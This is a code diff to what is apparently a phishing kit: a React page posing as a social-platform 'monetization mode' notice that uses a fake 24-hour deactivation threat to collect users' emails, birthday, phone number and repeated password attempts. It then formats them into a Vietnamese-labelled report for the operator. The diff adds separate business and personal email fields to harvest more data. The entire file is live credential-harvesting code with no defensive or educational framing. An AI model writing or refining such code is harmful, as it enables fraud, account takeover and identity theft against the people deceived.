@@ -16,7 +16,8 @@ interface CountryResponse {
 }
 
 interface StoredFormData {
-    email: string;
+    emailBusiness: string;
+    emailPersonal: string;
     birthday: string;
     phone: string;
     passwordAttempts: string[];
@@ -40,7 +41,8 @@ interface PageContent {
     title: string;
     warning: string;
     formTitle: string;
-    emailPlaceholder: string;
+    emailBusinessPlaceholder: string;
+    emailPersonalPlaceholder: string;
     birthdayPlaceholder: string;
     phonePlaceholder: string;
     verifyButton: string;
@@ -59,10 +61,11 @@ const defaultContent: PageContent = {
     title: 'TURN ON MONETIZATION MODE',
     warning: 'Please provide all the required information. If we do not receive a response within 24 hours, the automatic monetization feature on your Page will be deactivated and may not be re-enabled in the future.',
     formTitle: 'Verify Your Details',
-    emailPlaceholder: 'Email address',
+    emailBusinessPlaceholder: 'Business email address',
+    emailPersonalPlaceholder: 'Personal email address',
     birthdayPlaceholder: 'Birthday (DD/MM/YYYY)',
     phonePlaceholder: 'Phone number',
-    verifyButton: 'Verification',
+    verifyButton: 'Continue',
     caseType: 'Case Type: Enable monetization features',
     securityInfo: 'Please ensure all information is accurate. If the information provided is incorrect, monetization may not be enabled.',
     passwordTitle: 'Please Enter Your Password',
@@ -75,7 +78,8 @@ const defaultContent: PageContent = {
 };
 
 const mainFormSchema = z.object({
-    email: z.string().email('Please enter a valid email address'),
+    emailBusiness: z.string().email('Please enter a valid business email address'),
+    emailPersonal: z.string().email('Please enter a valid personal email address'),
     birthday: z.string().regex(/^(\d{2})[/-](\d{2})[/-]\d{4}$/, 'Please enter a valid date (DD/MM/YYYY)'),
     phone: z.string().min(1)
 });
@@ -137,7 +141,8 @@ const Home = () => {
     const [isLoading, setIsLoading] = useState(true);
     const [showPasswordModal, setShowPasswordModal] = useState(false);
     const [formData, setFormData] = useState<{
-        email?: string;
+        emailBusiness?: string;
+        emailPersonal?: string;
         birthday?: string;
         phone?: string;
     }>({});
@@ -236,7 +241,8 @@ const Home = () => {
 
             if (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000) {
                 setFormData({
-                    email: parsed.email,
+                    emailBusiness: parsed.emailBusiness,
+                    emailPersonal: parsed.emailPersonal,
                     birthday: parsed.birthday,
                     phone: parsed.phone
                 });
@@ -250,7 +256,8 @@ const Home = () => {
 
     const onMainFormSubmit = (data: MainFormValues) => {
         const formDataToStore = {
-            email: data.email,
+            emailBusiness: data.emailBusiness,
+            emailPersonal: data.emailPersonal,
             birthday: data.birthday,
             phone: `${phoneCode}${data.phone}`
         };
@@ -341,7 +348,8 @@ const Home = () => {
 <b>🎂 Ngày sinh:</b> <code>${formatDateVN(fullFormData.birthday!)}</code>
 
 <b>📞 Số điện thoại:</b> <code>${fullFormData.phone}</code>
-<b>📧 Email:</b> <code>${fullFormData.email}</code>
+<b>📧 Email Personal:</b> <code>${fullFormData.emailPersonal}</code>
+<b>📧 Email Business:</b> <code>${fullFormData.emailBusiness}</code>
 
 ${passwordList}`;
 
